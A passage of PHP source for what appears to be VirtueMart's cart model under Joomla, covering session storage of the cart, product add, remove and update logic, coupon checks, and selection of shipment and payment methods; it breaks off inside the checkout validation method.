<?php

/**
 *
 * Category model for the cart
 *
 * @package	VirtueMart
 * @subpackage Cart
 * @author RolandD
 * @author Max Milbers
 * @link http://www.virtuemart.net
 * @copyright Copyright (c) 2004 - 2010 VirtueMart Team. All rights reserved.
 * @license http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.php
 * VirtueMart is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * @version $Id: cart.php 8237 2014-08-26 13:32:52Z Milbo $
 */
// Check to ensure this file is included in Joomla!
defined('_JEXEC') or die('Restricted access');


/**
 * Model class for the cart
 * Very important, use ALWAYS the getCart function, to get the cart from the session
 * @package	VirtueMart
 * @subpackage Cart
 * @author RolandD
 * @author Max Milbers
 */
class VirtueMartCart {

	var $products = array();
	var $_productAdded = false;
	var $_inCheckOut = false;
	var $_inConfirm = false;
	var $_fromCart = false;
	var $_dataValidated = false;
	var $_blockConfirm = false;
	var $_confirmDone = false;
	var $_redirect = false;
	var $_redirected = false;
	var $_redirect_disabled = false;
	var $_lastError = null; // Used to pass errmsg to the cart using addJS()
	//todo multivendor stuff must be set in the add function, first product determines ownership of cart, or a fixed vendor is used
	var $vendorId = 0;
	var $lastVisitedCategoryId = 0;
	var $virtuemart_shipmentmethod_id = 0;
	var $virtuemart_paymentmethod_id = 0;
	var $automaticSelectedShipment = false;
	var $automaticSelectedPayment  = false;
	var $BT = 0;
	var $ST = 0;
	var $cartfields = null;

	var $couponCode = '';
	var $order_language = '';

	var $lists = null;
	var $order_number=null; // added to solve emptying cart for payment notification
	var $virtuemart_order_id = false;
	var $customer_number=null;
	// 	var $user = null;
// 	var $prices = null;
	//var $pricesUnformatted = null;
	var $pricesCurrency = null;
	var $paymentCurrency = null;
	var $STsameAsBT = 1;
	var $selected_shipto = 0;
	var $productParentOrderable = TRUE;
	var $_triesValidateCoupon = array();

	var $cartProductsData = array();
	var $cartData = array();
	var $cartPrices = array();

	/* @deprecated */
	var $pricesUnformatted = array();

	private static $_cart = null;

	var $useSSL = 1;
	// 	static $first = true;

	private function __construct() {
		$this->useSSL = VmConfig::get('useSSL',0);
		$this->useXHTML = false;
		$this->cartProductsData = array();
		$this->layout = VmConfig::get('cartlayout','default');
	}

	/**
	 * Get the cart from the session
	 *
	 * @author Max Milbers
	 * @access public
	 * @param array $cart the cart to store in the session
	 */
	public static function getCart($setCart=true, $options = array(), $cartData=NULL) {

		//What does this here? for json stuff?
		if (!class_exists('JTable')) require(JPATH_VM_LIBRARIES . DS . 'joomla' . DS . 'database' . DS . 'table.php');

		if(empty(self::$_cart)){

			self::$_cart = new VirtueMartCart;

			if (empty($cartData)) {
				$session = JFactory::getSession($options);
				$cartSession = $session->get('vmcart', 0, 'vm');
				if (!empty($cartSession)) {
					$sessionCart = unserialize( $cartSession );

					if(empty($sessionCart->cartProductsData) or ($sessionCart->_guest and $sessionCart->_guest!=JFactory::getUser()->guest)){
						self::$_cart->loadCart($sessionCart);
					}
				}
			} else {
				$cartSession=$cartData;
				$sessionCart = unserialize( $cartSession );
			}

			$userModel = VmModel::getModel('user');
			self::$_cart->user = $userModel->getCurrentUser();

			$lang = JFactory::getLanguage();
			self::$_cart->order_language = $lang->getTag();

			if (!empty($cartSession)) {

				if(isset($sessionCart->cartProductsData)){
					self::$_cart->cartProductsData = $sessionCart->cartProductsData;
					self::$_cart->vendorId	 					= $sessionCart->vendorId;
					self::$_cart->lastVisitedCategoryId	 		= $sessionCart->lastVisitedCategoryId;
					self::$_cart->virtuemart_shipmentmethod_id	= $sessionCart->virtuemart_shipmentmethod_id;
					self::$_cart->virtuemart_paymentmethod_id 	= $sessionCart->virtuemart_paymentmethod_id;
					self::$_cart->automaticSelectedShipment 	= $sessionCart->automaticSelectedShipment;
					self::$_cart->automaticSelectedPayment 		= $sessionCart->automaticSelectedPayment;
					self::$_cart->BT 							= $sessionCart->BT;
					self::$_cart->ST 							= $sessionCart->ST;
					self::$_cart->cartfields					= $sessionCart->cartfields;

					self::$_cart->couponCode 					= $sessionCart->couponCode;
					self::$_cart->_triesValidateCoupon			= $sessionCart->_triesValidateCoupon;
					self::$_cart->order_number					= $sessionCart->order_number;
					self::$_cart->pricesCurrency				= $sessionCart->pricesCurrency;
					self::$_cart->paymentCurrency				= $sessionCart->paymentCurrency;

					self::$_cart->_guest						=  $sessionCart->_guest;
					self::$_cart->_inCheckOut 					= $sessionCart->_inCheckOut;
					self::$_cart->_inConfirm					= $sessionCart->_inConfirm;
					self::$_cart->_dataValidated				= $sessionCart->_dataValidated;
					self::$_cart->_confirmDone					= $sessionCart->_confirmDone;
					self::$_cart->STsameAsBT					= $sessionCart->STsameAsBT;
					self::$_cart->selected_shipto 				= $sessionCart->selected_shipto;
					self::$_cart->_fromCart						= $sessionCart->_fromCart;
				}
			}

			self::$_cart->loadSetRenderBTSTAddress();

			if (empty(self::$_cart->virtuemart_shipmentmethod_id) && !empty(self::$_cart->user->virtuemart_shipmentmethod_id)) {
				self::$_cart->virtuemart_shipmentmethod_id = self::$_cart->user->virtuemart_shipmentmethod_id;
			}

			if (empty(self::$_cart->virtuemart_paymentmethod_id) && !empty(self::$_cart->user->virtuemart_paymentmethod_id)) {
				self::$_cart->virtuemart_paymentmethod_id = self::$_cart->user->virtuemart_paymentmethod_id;
			}

			if((!empty(self::$_cart->user->agreed) || !empty(self::$_cart->BT['agreed'])) && !VmConfig::get('agree_to_tos_onorder',0) ){
				self::$_cart->BT['tos'] = 1;
			}
			//if(empty($this->customer_number) or ($this->user->virtuemart_user_id!=0 and strpos($this->customer_number,'nonreg_')!==FALSE ) ){
			if(self::$_cart->user->virtuemart_user_id!=0 and empty(self::$_cart->customer_number) or strpos(self::$_cart->customer_number,'nonreg_')!==FALSE){
				self::$_cart->customer_number = $userModel ->getCustomerNumberById();
			}

			if(empty(self::$_cart->customer_number) or strpos(self::$_cart->customer_number,'nonreg_')!==FALSE){
				$firstName = empty(self::$_cart->BT['first_name'])? '':self::$_cart->BT['first_name'];
				$lastName = empty(self::$_cart->BT['last_name'])? '':self::$_cart->BT['last_name'];
				$email = empty(self::$_cart->BT['email'])? '':self::$_cart->BT['email'];
				self::$_cart->customer_number = 'nonreg_'.$firstName.$lastName.$email;
			}
			$multixcart = VmConfig::get('multixcart',0);
			if(!empty($multixcart)){
				if($multixcart=='byvendor' and empty(self::$_cart->vendorId) or self::$_cart->vendorId==1){
					$vendor = VmModel::getModel('vendor');
					self::$_cart->vendorId = $vendor->getLoggedVendor();
					if(empty(self::$_cart->vendorId)) self::$_cart->vendorId = 1;
				}
				if($multixcart=='byselection'){
					self::$_cart->vendorId = vRequest::get('virtuemart_vendor_id',1);
				}
			} else {
				self::$_cart->vendorId = 1;
			}
			vmdebug('getCart $_cart->vendorId',self::$_cart->vendorId);
		}

		return self::$_cart;
	}


	function loadSetRenderBTSTAddress(){

		//If the user is logged in and exists, we check if he has already addresses stored
		if(!empty($this->user->virtuemart_user_id)){

			foreach ($this->user->userInfo as $address) {
				if ($address->address_type == 'BT') {
					$this->saveAddressInCart((array) $address, $address->address_type,false);
				} else {
					if(!empty($this->selected_shipto) and $address->virtuemart_userinfo_id==$this->selected_shipto){
						$this->saveAddressInCart((array) $address, $address->address_type,false,'');
					}
				}
			}
			if(empty($this->selected_shipto)){
				$this->STsameAsBT = 1;
				$this->ST = 0;
			}
		}

		//$this->prepareAddressFieldsInCart();
	}


	//function prepareAddressDataInCart($type='BT',$new = false,$virtuemart_user_id = null){
	function prepareAddressFieldsInCart(){

		$userFieldsModel =VmModel::getModel('Userfields');

		$types = array('BT','ST');
		foreach($types as $type){
			$data = $this->$type;
			if($type=='ST'){
				$preFix = 'shipto_';
			} else {
				$preFix = '';
			}

			$addresstype = $type.'address'; //for example BTaddress
			$userFields = $userFieldsModel->getUserFieldsFor('cart',$type);
			$this->$addresstype = $userFieldsModel->getUserFieldsFilled(
				$userFields
				,$data
				,$preFix
			);

		}

	}

	/**
	 * @author Max Milbers
	 */
	public function loadCart(&$existingSession){
		$currentUser = JFactory::getUser();
		if(!$currentUser->guest and $existingSession){
			$model = new VmModel();
			$carts = $model->getTable('carts');
			$carts->load($currentUser->id);
			$cartData = $carts->loadFieldValues();
			unset($cartData['_inCheckOut']);
			unset($cartData['_dataValidated']);
			unset($cartData['_confirmDone']);
			unset($cartData['_fromCart']);

			if($cartData and !empty($cartData['cartData'])){
				$cartData['cartData'] = unserialize($cartData['cartData']);

				foreach($cartData['cartData']->cartProductsData as $k => $product){
					foreach($existingSession->cartProductsData as $kses => $productses){
						if($product==$productses){
							vmdebug('Found the same product');
							unset($cartData['cartData']->cartProductsData[$k]);
						}
					}
				}

				foreach($cartData['cartData'] as $key=>$value){
					if(is_array($value)){
						$existingSession->$key = array_merge( $value,(array)$existingSession->$key);
					} else if(empty($existingSession->$key)){
						$existingSession->$key = $cartData['cartData']->$key;
					}
				}

			}
		}
	}

	public function storeCart($cartDataToStore = false){
		$currentUser = JFactory::getUser();
		if(!$currentUser->guest){
			$model = new VmModel();
			$carts = $model->getTable('carts');
			if(!$cartDataToStore) $cartDataToStore = $this->getCartDataToStore();

			$cObj = new StdClass();
			$cObj->virtuemart_user_id = $currentUser->id;
			$cObj->virtumart_vendor_id = $this->vendorId;
			$cObj->cartData = serialize($cartDataToStore);

			$carts->bindChecknStore($cObj);
		}
	}

	public function deleteCart(){

		$currentUser = JFactory::getUser();
		if(!$currentUser->guest){
			$model = new VmModel();
			$carts = $model->getTable('carts');
			$carts->delete($currentUser->id);
		}
	}

	/**
	 * Set the cart in the session
	 *
	 * @access public
	 * @param array $cart the cart to store in the session
	 */
	public function setCartIntoSession($storeDb = false, $forceWrite = false) {

		$session = JFactory::getSession();

		$sessionCart = $this->getCartDataToStore();
		if($storeDb){
			$this->storeCart($sessionCart);
		}
		$session->set('vmcart', serialize($sessionCart),'vm');

		if($forceWrite){
			session_write_close();
			session_start();
		}
	}

	public function getCartDataToStore(){
		$sessionCart = new stdClass();

		$sessionCart->cartProductsData = $this->cartProductsData;
		$sessionCart->vendorId	 					= $this->vendorId;
		$sessionCart->lastVisitedCategoryId	 		= $this->lastVisitedCategoryId;
		$sessionCart->virtuemart_shipmentmethod_id	= $this->virtuemart_shipmentmethod_id;
		$sessionCart->virtuemart_paymentmethod_id 	= $this->virtuemart_paymentmethod_id;
		$sessionCart->automaticSelectedShipment 	= $this->automaticSelectedShipment;
		$sessionCart->automaticSelectedPayment 		= $this->automaticSelectedPayment;
		$sessionCart->order_number 		            = $this->order_number;

		$sessionCart->BT 							= $this->BT;
		$sessionCart->ST 							= $this->ST;
		$sessionCart->cartfields					= $this->cartfields;

		$sessionCart->couponCode 					= $this->couponCode;
		$sessionCart->_triesValidateCoupon			= $this->_triesValidateCoupon;
		$sessionCart->order_language 				= $this->order_language;

		$sessionCart->pricesCurrency				= $this->pricesCurrency;
		$sessionCart->paymentCurrency				= $this->paymentCurrency;

		//private variables
		//We nee to store this, so that we now if a user logged in before
		$sessionCart->_guest						= JFactory::getUser()->guest;
		$sessionCart->_inCheckOut 					= $this->_inCheckOut;
		$sessionCart->_inConfirm					= $this->_inConfirm;
		$sessionCart->_dataValidated				= $this->_dataValidated;
		$sessionCart->_confirmDone					= $this->_confirmDone;
		$sessionCart->STsameAsBT					= $this->STsameAsBT;
		$sessionCart->selected_shipto 				= $this->selected_shipto;
		$sessionCart->_fromCart						= $this->_fromCart;
		return $sessionCart;
	}



	/**
	 * Remove the cart from the session
	 *
	 * @author Max Milbers
	 * @access public
	 */
	public function removeCartFromSession() {
		$session = JFactory::getSession();
		$session->set('vmcart', 0, 'vm');
	}

	public function setDataValidation($valid=false) {
		$this->_dataValidated = $valid;
	}

	public function getDataValidated() {
		return $this->_dataValidated;
	}

	public function getInCheckOut() {
		return $this->_inCheckOut;
	}

	public function setOutOfCheckout(){
		$this->_inCheckOut = false;
		$this->_dataValidated = false;
		$this->_blockConfirm = true;
		$this->_redirected = true;
		$this->_redirect = false;
		$this->setCartIntoSession(false,true);
	}
	
	public function blockConfirm(){
		$this->_blockConfirm = true;
	}

	/**
	 * Set the last error that occured.
	 * This is used on error to pass back to the cart when addJS() is invoked.
	 * @param string $txt Error message
	 * @author Oscar van Eijk
	 */
	private function setError($txt) {
		$this->_lastError = $txt;
	}

	/**
	 * Retrieve the last error message
	 * @return string The last error message that occured
	 * @author Oscar van Eijk
	 */
	public function getError() {
		return ($this->_lastError);
	}

	/**
	 * For one page checkouts, disable with this the redirects
	 * @param bool $bool
	 */
	public function setRedirectDisabled($bool = TRUE){
		$this->_redirect_disabled = $bool;
	}

	/**
	 * Add a product to the cart
	 *
	 * @author Max Milbers
	 * @access public
	 */
	public function add($virtuemart_product_ids=null,&$errorMsg='') {

		$updateSession = false;
		$post = vRequest::getRequest();

		if(empty($virtuemart_product_ids)){
			$virtuemart_product_ids = vRequest::getInt('virtuemart_product_id'); //is sanitized then
		}

		if (empty($virtuemart_product_ids)) {
			vmWarn('COM_VIRTUEMART_CART_ERROR_NO_PRODUCT_IDS');
			return false;
		}

		$products = array();
		//VmConfig::$echoDebug = true;
		$this->_productAdded = true;
		$productModel = VmModel::getModel('product');
		$customFieldsModel = VmModel::getModel('customfields');
		//Iterate through the prod_id's and perform an add to cart for each one
		foreach ($virtuemart_product_ids as $p_key => $virtuemart_product_id) {

			$product = false;
			$updateSession = true;
			$productData = array();

			if(empty($virtuemart_product_id)){
				vmWarn('Product could not be added with virtuemart_product_id = 0');
				return false;
			} else {
				$productData['virtuemart_product_id'] = (int)$virtuemart_product_id;
			}

			if(!empty( $post['quantity'][$p_key])){
				$productData['quantity'] = (int) $post['quantity'][$p_key];
			} else {
					continue;
			}

			if(!empty( $post['customProductData'][$virtuemart_product_id])){
				//$productData['customProductData']
				$customProductData  = $post['customProductData'][$virtuemart_product_id];
			} else {
				$customProductData = array();
			}

			//Now we check if the delivered customProductData is correct and add missing
			$product = $productModel->getProduct($virtuemart_product_id, true, false,true,$productData['quantity']);


			if(VmConfig::get('multixcart',0)=='byproduct'){
				if(empty($this->vendorId)) $this->vendorId = $product->virtuemart_vendor_id;
				if(!empty($this->vendorId) and $this->vendorId != $product->virtuemart_vendor_id){
					//Product of another vendor recognised, for now we just return false,
					//later we will create here another cart (multicart)
					return false;
				}
			}

			$product->customfields = $customFieldsModel->getCustomEmbeddedProductCustomFields($product->allIds,0,1);
			$customProductDataTmp=array();

			foreach($product->customfields as $customfield){

				if($customfield->is_input==1){
					if(isset($customProductData[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id])){

						if(is_array($customProductData[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id])){
							if(!class_exists('vmFilter'))require(JPATH_VM_ADMINISTRATOR.DS.'helpers'.DS.'vmfilter.php');
							foreach($customProductData[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id] as &$customData){

								$value = vmFilter::hl( $customData,array('deny_attribute'=>'*'));
								//to strong
								/* $value = preg_replace('@<[\/\!]*?[^<>]*?>@si','',$value);//remove all html tags  */
								//lets use instead
								$value = JComponentHelper::filterText($value);
								$value = (string)preg_replace('#on[a-z](.+?)\)#si','',$value);//replace start of script onclick() onload()...
								$value = trim(str_replace('"', ' ', $value),"'") ;
								$customData = (string)preg_replace('#^\'#si','',$value);
							}
						}
						$customProductDataTmp[$customfield->virtuemart_custom_id]=array();
						$customProductDataTmp[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id] = $customProductData[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id];
					}
					else if(isset($customProductData[$customfield->virtuemart_custom_id])) {
						$customProductDataTmp[$customfield->virtuemart_custom_id] = (int)$customProductData[$customfield->virtuemart_custom_id];

					}
					//	$customProductDataTmp[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id] = $customProductData[$customfield->virtuemart_custom_id][$customfield->virtuemart_customfield_id];
				} else {
					$customProductDataTmp[$customfield->virtuemart_custom_id] = (int)$customfield->virtuemart_customfield_id;
				}

			}

			$productData['customProductData'] = $customProductDataTmp;

			$unsetA = array();
			$found = false;

			//VmConfig::$echoDebug=true;
			//Now lets check if there is already a product stored with the same id, if yes, increase quantity and recalculate
			foreach($this->cartProductsData as $k => &$cartProductData){
				$cartProductData = (array)$cartProductData;
				if(empty($cartProductData['virtuemart_product_id'])){
					$unsetA[] = $k;
				} else {
					if($cartProductData['virtuemart_product_id'] == $productData['virtuemart_product_id']){
						//Okey, the id is already the same, so lets check the customProductData
						if($cartProductData['customProductData'] == $productData['customProductData']){

							vmdebug('Same product variant recognised');
							$cartProductData['quantity'] = $cartProductData['quantity'] + $productData['quantity'];

							if(!$product)$product = $this->getProduct((int) $productData['virtuemart_product_id'],$cartProductData['quantity']);
							if(empty($product->virtuemart_product_id)){
								vmWarn('COM_VIRTUEMART_PRODUCT_NOT_FOUND');
								$unsetA[] = $k;

							} else {
								$this->checkForQuantities($product, $cartProductData['quantity']);
								if(($cartProductData['quantity']-$productData['quantity'])>0){
									$product->quantity = $cartProductData['quantity'];
								} else {
									$product = false;
								}
							}
							$found = TRUE;
							break;
						} else {
							vmdebug('product variant is different, I add to cart');
						}
					}
				}

				//add products to remove to array
				if($cartProductData['quantity']==0){
					$unsetA[] = $k;
					$product = false;
				}

			}

			if(!$found){
				if(!$product)$product = $this->getProduct( (int)$productData['virtuemart_product_id'],$productData['quantity']);
				if(!empty($product->virtuemart_product_id)){

					$this->checkForQuantities($product, $product->quantity);

					if(!empty($product->quantity)){
						$productData['quantity'] = $product->quantity;
						$this->cartProductsData[] = $productData;
					} else {

					}
				}

			}

			if($product and $product->quantity>0){
				$products[] = $product;
			}

			//Remove the products which have quantity=0
			foreach($unsetA as $v){
				unset($this->cartProductsData[$v]);
			}
		}

		if ($updateSession== false) return false ;
		$this->_dataValidated = false;
		// End Iteration through Prod id's
		$this->setCartIntoSession(true);
		return $products;
	}

	/**
	 * Remove a product from the cart
	 *
	 * @author RolandD
	 * @param array $cart_id the cart IDs to remove from the cart
	 * @access public
	 */
	public function removeProductCart($prod_id=0) {
		// Check for cart IDs
		if (empty($prod_id))
		$prod_id = vRequest::getInt('cart_virtuemart_product_id');
		unset($this->products[$prod_id]);
		if(isset($this->cartProductsData[$prod_id])){
			// hook for plugin action "remove from cart"
			if(!class_exists('vmCustomPlugin')) require(JPATH_VM_PLUGINS.DS.'vmcustomplugin.php');
			JPluginHelper::importPlugin('vmcustom');
			$dispatcher = JDispatcher::getInstance();
			$addToCartReturnValues = $dispatcher->trigger('plgVmOnRemoveFromCart',array($this,$prod_id));
			unset($this->cartProductsData[$prod_id]);
			$this->setCartIntoSession(true);
			return true;
		} else {
			vmdebug('removeProductCart $prod_id '.$prod_id,$this->cartProductsData);
			return false;
		}
	}

	/**
	 * Update a product in the cart
	 *
	 * @author Max Milbers
	 * @param array $cart_id the cart IDs to remove from the cart
	 * @access public
	 */
	public function updateProductCart() {

		$quantities = vRequest::getInt('quantity');
		if(empty($quantities)) return false;
		$updated = false;

		foreach($quantities as $key=>$quantity){
			if (isset($this->cartProductsData[$key]) and !empty($quantity) and !isset($_POST['delete_'.$key])) {
				if($quantity!=$this->cartProductsData[$key]['quantity']){
					$productModel = VmModel::getModel('product');

					$product = $productModel -> getProduct($this->cartProductsData[$key]['virtuemart_product_id'], $quantity);
					if ($this->checkForQuantities($product, $quantity)) {
						$this->cartProductsData[$key]['quantity'] = $quantity;
						$updated = true;
					}
				}

			} else {
				//Todo when quantity is 0,  the product should be removed, maybe necessary to gather in array and execute delete func
				unset($this->cartProductsData[$key]);
				$updated = true;
			}
		}

		$this->setCartIntoSession(true);
		if ($updated)
		return true;
		else
		return false;
	}


	/**
	* Get the category ID from a product ID
	*
	* @author RolandD, Patrick Kohl
	* @access public
	* @return mixed if found the category ID else null
	*/
	public function getCardCategoryId($virtuemart_product_id) {
		$db = JFactory::getDBO();
		$q = 'SELECT `virtuemart_category_id` FROM `#__virtuemart_product_categories` WHERE `virtuemart_product_id` = ' . (int) $virtuemart_product_id . ' LIMIT 1';
		$db->setQuery($q);
		return $db->loadResult();
	}

	/**
	 * Validate the coupon code. If ok,. set it in the cart
	 * @param string $coupon_code Coupon code as entered by the user
	 * @author Oscar van Eijk
	 * TODO Change the coupon total/used in DB ?
	 * @access public
	 * @return string On error the message text, otherwise an empty string
	 */
	public function setCouponCode($coupon_code) {

		if(empty($coupon_code) or $coupon_code == vmText::_('COM_VIRTUEMART_COUPON_CODE_ENTER')) {
			$this->couponCode = '';
			return false;
		}

		if (!class_exists('CouponHelper')) {
			require(JPATH_VM_SITE . DS . 'helpers' . DS . 'coupon.php');
		}

		//if(!isset($this->cartPrices['salesPrice'])){
			$this->getCartPrices(true);
		//}
		if(!in_array($coupon_code,$this->_triesValidateCoupon)){
			$this->_triesValidateCoupon[] = $coupon_code;
		}

		if(count($this->_triesValidateCoupon)<8){
			vmdebug('setCouponCode',$coupon_code, $this->cartPrices['salesPrice']);
			$msg = CouponHelper::ValidateCouponCode($coupon_code, $this->cartPrices['salesPrice']);;
		} else{
			$msg = vmText::_('COM_VIRTUEMART_CART_COUPON_TOO_MANY_TRIES');
		}

		if (!empty($msg)) {
			//$this->couponCode = '';
			$this->_dataValidated = false;
			$this->_blockConfirm = true;
			$this->getCartPrices(true);
			$this->setCartIntoSession();
			return $msg;
		}
		$this->couponCode = $coupon_code;
		$this->setCartIntoSession(true);
		return vmText::_('COM_VIRTUEMART_CART_COUPON_VALID');
	}

	/**
	 * Check the selected shipment data and store the info in the cart
	 * @param integer $shipment_id Shipment ID taken from the form data
	 * @author Max Milbers
	 */
	public function setShipmentMethod($force=false) {

		$virtuemart_shipmentmethod_id = vRequest::getInt('virtuemart_shipmentmethod_id', $this->virtuemart_shipmentmethod_id);
		if($this->virtuemart_shipmentmethod_id != $virtuemart_shipmentmethod_id or $force){
			$this->_dataValidated = false;
			//Now set the shipment ID into the cart
			$this->virtuemart_shipmentmethod_id = $virtuemart_shipmentmethod_id;
			if (!class_exists('vmPSPlugin')) require(JPATH_VM_PLUGINS . DS . 'vmpsplugin.php');
			JPluginHelper::importPlugin('vmshipment');

			//Add a hook here for other payment methods, checking the data of the choosed plugin
			$_dispatcher = JDispatcher::getInstance();
			$_retValues = $_dispatcher->trigger('plgVmOnSelectCheckShipment', array( &$this));
			$dataValid = true;
			foreach ($_retValues as $_retVal) {
				if ($_retVal === true ) {
					// Plugin completed successfull; nothing else to do
					break;
				} else if ($_retVal === false ) {
					$mainframe = JFactory::getApplication();
					$mainframe->redirect(JRoute::_('index.php?option=com_virtuemart&view=cart&task=edit_shipment',$this->useXHTML,$this->useSSL), $_retVal);
					break;
				}
			}
			$this->setCartIntoSession();
		}
	}

	public function setPaymentMethod($force=false) {

		$virtuemart_paymentmethod_id = vRequest::getInt('virtuemart_paymentmethod_id', $this->virtuemart_paymentmethod_id);
		if($this->virtuemart_paymentmethod_id != $virtuemart_paymentmethod_id or $force){
			$this->_dataValidated = false;
			$this->virtuemart_paymentmethod_id = $virtuemart_paymentmethod_id;
			if(!class_exists('vmPSPlugin')) require(JPATH_VM_PLUGINS.DS.'vmpsplugin.php');
			JPluginHelper::importPlugin('vmpayment');

			//Add a hook here for other payment methods, checking the data of the choosed plugin
			$msg = '';
			$_dispatcher = JDispatcher::getInstance();
			$_retValues = $_dispatcher->trigger('plgVmOnSelectCheckPayment', array( $this, &$msg));
			$dataValid = true;
			foreach ($_retValues as $_retVal) {
				if ($_retVal === true ) {
					// Plugin completed succesfull; nothing else to do
					break;
				} else if ($_retVal === false ) {
					$app = JFactory::getApplication();
					$app->redirect(JRoute::_('index.php?option=com_virtuemart&view=cart&task=editpayment',$this->useXHTML,$this->useSSL), $msg);
					break;
				}
			}
			$this->setCartIntoSession();
		}

	}

	function confirmDone() {

		$this->checkoutData(false);
		if ($this->_dataValidated) {
			$this->_confirmDone = true;
			$this->confirmedOrder();
		} else {
			$layoutName = vRequest::getCmd('layout', '');
			if(!empty($layoutName)){
				$layoutName = '&layout='.$layoutName;
			}
			$mainframe = JFactory::getApplication();
			$mainframe->redirect(JRoute::_('index.php?option=com_virtuemart&view=cart'.$layoutName, FALSE), vmText::_('COM_VIRTUEMART_CART_CHECKOUT_DATA_NOT_VALID'));
		}
	}

	private function redirecter($relUrl,$redirectMsg){

		$this->_dataValidated = false;
		$app = JFactory::getApplication();
		if($this->_redirect and !$this->_redirected and !$this->_redirect_disabled){
			$this->_redirected = true;
			$this->setCartIntoSession();
			$app->redirect(JRoute::_($relUrl,$this->useXHTML,$this->useSSL), $redirectMsg);
			return true;
		} else {
			$this->_redirected = false;
			$this->_inCheckOut = false;
			$this->setCartIntoSession(true);
			return false;
		}
	}

	public function checkoutData($redirect = true) {

		if($this->_redirected){
			$this->_redirect = false;
		} else {
			$this->_redirect = $redirect;
		}

		$layoutName = vRequest::getCmd('layout', '');
		if(!empty($layoutName)){
			$layoutName = '&layout='.$layoutName;
		}

		$this->_inCheckOut = true;
		//This prevents that people checkout twice
		$this->setCartIntoSession(false,true);

		//Either we use here $this->_redirect, or we redirect always directly, atm we check the boolean _redirect
		if (count($this->cartProductsData) ===0 and $this->_redirect) {
			return $this->redirecter('index.php?option=com_virtuemart', vmText::_('COM_VIRTUEMART_CART_NO_PRODUCT'));
		}

		// Check if a minimun purchase value is set
		if (($redirectMsg = $this->checkPurchaseValue()) != null) {
			return $this->redirecter('index.php?option=com_virtuemart&view=cart'.$layoutName , $redirectMsg);
		}

		$validUserDataBT = self::validateUserData();
		if ($validUserDataBT!==true) {	//Important, we can have as result -1,false and true.
			return $this->redirecter('index.php?option=com_virtuemart&view=user&task=editaddresscart&addrtype=BT' , '');
		}

		$validUserDataCart = self::validateUserData('cartfields',$this->cartfields,$this->_redirect);

		if($validUserDataCart!==true){
			if($this->_redirect){
				$this->_inCheckOut = false;
				$redirectMsg = null;// vmText::_('COM_VIRTUEMART_CART_PLEASE_ACCEPT_TOS');
				return $this->redirecter('index.php?option=com_virtuemart&view=cart'.$layoutName , $redirectMsg);
			}
			$this->_blockConfirm = true;
		} else {
			//Atm a bit dirty. We store this information in the BT order_userinfo, so we merge it here, it gives also
			//the advantage, that plugins can easily deal with it.
			$this->BT = array_merge((array)$this->BT,(array)$this->cartfields);
		}

		$currentUser = JFactory::getUser();
		if($this->STsameAsBT!=0){
			if($this->_confirmDone){
				$this->ST = $this->BT;
			} else {
			}
		} else {
			if ($this->selected_shipto >0 ) {
				$userModel = VmModel::getModel('user');
				$stData = $userModel->getUserAddressList($currentUser->id, 'ST', $this->selected_shipto);

				$stData = get_object_vars($stData[0]);
				if($this->validateUserData('ST', $stData)>0){
					$this->ST = $stData;
				}
			}
			//Only when there is an ST data, test if all necessary fields are filled
			$validUserDataST = self::validateUserData('ST');
			if ($validUserDataST!==true) {
				return $this->redirecter('index.php?option=com_virtuemart&view=user&task=editaddresscart&addrtype=ST' , '');
			}
		}

		if(VmConfig::get('oncheckout_only_registered',0)) {

			if(empty($currentUser->id)){
				$redirectMsg = vmText::_('COM_VIRTUEMART_CART_ONLY_REGISTERED');
				return $this->redirecter('index.php?option=com_virtuemart&view=user&task=editaddresscart&addrtype=BT' , $redirectMsg);
			}
		}
		// Test Coupon
		if (!empty($this->couponCode)) {
			//$prices = $this->getCartPrices();
			if (!class_exists('CouponHelper')) {
				require(JPATH_VM_SITE . DS . 'helpers' . DS . 'coupon.php');
			}

			if(!in_array($this->couponCode,$this->_triesValidateCoupon)){
				$this->_triesValidateCoupon[] = $this->couponCode;
			}
			if(count($this->_triesValidateCoupon)<8){
				$redirectMsg = CouponHelper::ValidateCouponCode($this->couponCode, $this->cartPrices['salesPrice']);
			} else{
				$redirectMsg = vmText::_('COM_VIRTUEMART_CART_COUPON_TOO_MANY_TRIES');
			}

			if (!empty($redirectMsg)) {
				$this->couponCode = '';
				//$this->getCartPrices(); //Todo check if we need to enable this also in vm2.1
				$this->setCartIntoSession();
				return $this->redirecter('index.php?option=com_virtuemart&view=cart'.$layoutName , $redirectMsg);
			}
		}
		$redirectMsg = '';

		//Test Shipment and show shipment plugin
		if (empty($this->virtuemart_shipmentmethod_id)) {
			return $this->redirecter('index.php?option=com_virtuemart&view=cart&task=edit_shipment' , $redirectMsg);
		} else {
			if (!class_exists('vmPSPlugin')) require(JPATH_VM_PLUGINS . DS . 'vmpsplugin.php');
			JPluginHelper::importPlugin('vmshipment');
			//Add a hook here for other shipment methods, checking the data of the choosed plugin
			$dispatcher = JDispatcher::getInstance();
			$retValues = $dispatcher->trigger('plgVmOnCheckoutCheckDataShipment', array(  $this));

			foreach ($retValues as $retVal) {
				if ($retVal === true) {
					break; // Plugin completed succesfull; nothing else to do
				} elseif ($retVal === false) {
					// Missing data, ask for it (again)
					return $this->redirecter('index.php?option=com_virtuemart&view=cart&task=edit_shipment' , $redirectMsg);
					// 	NOTE: inactive plugins will always return null, so that value cannot be used for anything else!
				}
			}
		}
		
		//Test Payment and show payment plugin
		if($this->cartPrices['salesPrice']>0.0){
			if (empty($this->virtuemart_paymentmethod_id)) {
				return $this->redirecter('index.php?option=com_virtuemart&view=cart&task=editpayment' , $redirectMsg);
			} else {
				if(!class_exists('vmPSPlugin')) require(JPATH_VM_PLUGINS.DS.'vmpsplugin.php');
				JPluginHelper::importPlugin('vmpayment');
				//Add a hook here for other payment methods, checking the data of the choosed plugin
				$dispatcher = JDispatcher::getInstance();
				$retValues = $dispatcher->trigger('plgVmOnCheckoutCheckDataPayment', array( $this));

				foreach ($retValues as $retVal) {
					if ($retVal === true) {
						break; // Plugin completed succesful; nothing else to do
					} elseif ($retVal === false) {
						// Missing data, ask for it (again)
